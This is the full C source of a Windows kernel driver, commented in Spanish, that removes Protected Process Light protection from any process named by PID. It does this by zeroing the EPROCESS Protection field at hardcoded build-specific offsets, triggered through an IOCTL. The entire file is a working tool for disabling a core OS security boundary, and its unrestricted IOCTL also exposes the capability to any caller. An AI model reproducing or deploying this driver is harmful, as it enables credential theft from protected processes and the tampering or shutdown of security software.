#include <ntddk.h>

#define IOCTL_ZERO_PROTECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _PROTECTION_REQUEST {
    ULONG ProcessId;
    ULONG ProtectionOffset; // Si es 0, el driver lo resuelve automáticamente por la build
} PROTECTION_REQUEST, *PPROTECTION_REQUEST;

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD     DriverUnload;
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRV_DISPATCH      DispatchRoutine;

NTSTATUS ZeroProcessProtection(ULONG ProcessId, ULONG ProtectionOffset);
ULONG GetDynamicProtectionOffset(void);

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = DriverUnload;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchRoutine;

    UNICODE_STRING deviceName  = RTL_CONSTANT_STRING(L"\\Device\\DkomProtDevice");
    UNICODE_STRING symLinkName = RTL_CONSTANT_STRING(L"\\??\\DkomProtDevice");

    PDEVICE_OBJECT deviceObject = NULL;
    NTSTATUS status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status))
        return status;

    status = IoCreateSymbolicLink(&symLinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }

    DbgPrint("[DKOM] Driver loaded successfully. Dynamic offset resolved for current build.\n");
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symLinkName = RTL_CONSTANT_STRING(L"\\??\\DkomProtDevice");
    IoDeleteSymbolicLink(&symLinkName);
    IoDeleteDevice(DriverObject->DeviceObject);
    DbgPrint("[DKOM] Driver unloaded.\n");
}

NTSTATUS DispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    if (stack->Parameters.DeviceIoControl.IoControlCode != IOCTL_ZERO_PROTECTION) {
        status = STATUS_INVALID_DEVICE_REQUEST;
        goto Complete;
    }

    if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(PROTECTION_REQUEST)) {
        status = STATUS_BUFFER_TOO_SMALL;
        goto Complete;
    }

    PPROTECTION_REQUEST req = (PPROTECTION_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    if (req == NULL) {
        status = STATUS_INVALID_PARAMETER;
        goto Complete;
    }

    status = ZeroProcessProtection(req->ProcessId, req->ProtectionOffset);

Complete:
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

// Función auxiliar para estimar el offset de _EPROCESS->Protection según la Build
ULONG GetDynamicProtectionOffset(void)
{
    RTL_OSVERSIONINFOW osVer = { 0 };
    osVer.dwOSVersionInfoSize = sizeof(osVer);
    
    // Obtenemos la versión del sistema operativo en ejecución
    if (NT_SUCCESS(RtlGetVersion(&osVer))) {
        // Windows 11 Builds recientes (ej. 24H2 en adelante)
        if (osVer.dwMajorVersion == 10 && osVer.dwBuildNumber >= 26100) {
            return 0x5FA; 
        }
        // Windows 10 y Windows 11 tempranos (Builds 19041 hasta 22631)
        else if (osVer.dwMajorVersion == 10 && osVer.dwBuildNumber >= 19041) {
            return 0x87A;
        }
    }
    
    // Valor por defecto seguro para laboratorios estándar si no coincide
    return 0x87A;
}

NTSTATUS ZeroProcessProtection(ULONG ProcessId, ULONG ProtectionOffset)
{
    PEPROCESS process = NULL;
    NTSTATUS status = STATUS_SUCCESS;

    // Si el usuario no especificó un offset válido (0), lo resolvemos dinámicamente
    if (ProtectionOffset == 0) {
        ProtectionOffset = GetDynamicProtectionOffset();
    }

    // Validación de seguridad estricta del rango del offset dentro de _EPROCESS
    if (ProtectionOffset < 0x100 || ProtectionOffset > 0x2000) {
        return STATUS_INVALID_PARAMETER;
    }

    // Obtener puntero PEPROCESS a partir del PID
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    // Calcular la dirección exacta del campo Protection en memoria de kernel
    PUCHAR targetProtectionAddress = (PUCHAR)process + ProtectionOffset;

    // Escribir 0 de forma atómica para limpiar la protección PPL
    InterlockedExchange8((volatile CHAR*)targetProtectionAddress, 0);

    // Liberar la referencia al objeto del proceso
    ObDereferenceObject(process);

    DbgPrint("[DKOM] Process PID %lu protection cleared at address %p using offset 0x%X\n", 
        ProcessId, targetProtectionAddress, ProtectionOffset);
    
    return STATUS_SUCCESS;
}
